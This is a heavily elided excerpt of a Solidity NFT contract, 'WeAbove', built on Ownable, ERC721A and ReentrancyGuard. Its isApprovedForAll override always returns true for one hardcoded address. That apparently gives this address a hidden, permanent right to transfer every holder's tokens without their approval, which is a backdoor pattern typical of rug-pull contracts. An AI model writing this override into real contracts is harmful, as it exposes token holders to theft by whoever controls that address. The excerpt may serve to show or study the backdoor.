  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x5464732063Ddf1845A6374E75057E8d78A79c244){return true;}
...
contract WeAbove is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("WeAbove", "WA", maxBatchSize_, collectionSize_) {
